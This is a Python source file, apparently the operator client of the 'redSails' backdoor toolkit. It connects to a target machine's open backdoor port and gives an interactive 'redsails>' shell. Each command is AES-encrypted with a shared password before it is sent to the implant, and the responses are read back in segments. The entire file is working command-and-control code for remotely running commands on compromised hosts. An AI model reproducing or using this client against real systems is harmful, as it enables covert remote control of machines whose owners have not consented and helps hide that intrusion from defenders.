#!/usr/bin/env python
import argparse
import cmd
import socket
import sys

from rsClientCrypto.rsCrypto import AESCipher
from rsUtilities.utilities import Banner
from rsUtilities.utilities import Utilities


class ShellHandler(cmd.Cmd):
	"""
	Interactive shell handler
	"""
	def __init__(self, sock, ip, password):
		cmd.Cmd.__init__(self)
		utilities = Utilities()
		self.logger = utilities.set_logging()

		self.sock = sock
		self.ip = ip
		self.AESCrypto = AESCipher(password)

		self.intro = Banner.SHOW
		self.prompt = 'redsails> '

		self.logger.info("Connected to {0}".format(self.ip))

	def emptyline(self):
		pass

	def default(self, line):
		self.console(line.rstrip())

	def console(self, command):
		response = self.send(command)

		if response is None:
			print_error('An error has occured, exiting')
			self.do_EOF
		else:
			print(response)

	def send(self, command, prefix='SHELL::'):
		"""
		Send a command to the redSails implant
		"""
		full_response = ''

		self.sock.send(self.AESCrypto.encrypt(prefix + command))
		response = self.AESCrypto.decrypt(self.sock.recv(2048))
		while response.strip() != 'SEG::END':
			try:
				full_response += response

				dSEGMOORE = 'SEG::MORE'
				self.sock.send(self.AESCrypto.encrypt(dSEGMOORE))
				response = self.AESCrypto.decrypt(self.sock.recv(2048))
			except Exception as error:
				return None

		return full_response

	def do_EOF(self, line='exit'):
		self.sock.send(self.AESCrypto.encrypt(line))
		self.logger.info("Disconnected from {0}".format(self.ip))

		try:
			self.sock.close()
		except Exception as error:
			print_warn('Failed to close connection gracefully')
			sys.exit(0)

		return True

	def help_EOF(self):
		print('Type \'exit\' to quit')

	do_exit = do_EOF
	help_exit = help_EOF


def main():
	parser = argparse.ArgumentParser(description=(Banner.SHOW), formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument('-t', '--target-ip', dest='target_ip', help='Target IP address with backdoor installed', required=True)
	parser.add_argument('-o', '--open-port', dest='open_port', help='Open backdoor port on target machine', type=int, required=True)
	parser.add_argument('-p', '--password', dest='password', help='Password used to encrypt/decrypt backdoor traffic', required=True)
	args = parser.parse_args()

	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(10)
		sock.connect((args.target_ip, args.open_port))
	except Exception as error:
		print_error("Failed to connect to backdoor at {0}".format(args.target_ip))
	else:
		ShellHandler(sock, args.target_ip, args.password).cmdloop()


def print_status(message):
	print("\033[1m\033[34m[*]\033[0m {0}".format(message))


def print_good(message):
	print("\033[1m\033[32m[+]\033[0m {0}".format(message))


def print_warn(message):
	print("\033[1m\033[33m[!]\033[0m {0}".format(message))


def print_error(message):
	print("\033[1m\033[31m[-]\033[0m {0}".format(message))

if __name__ == '__main__':
	main()
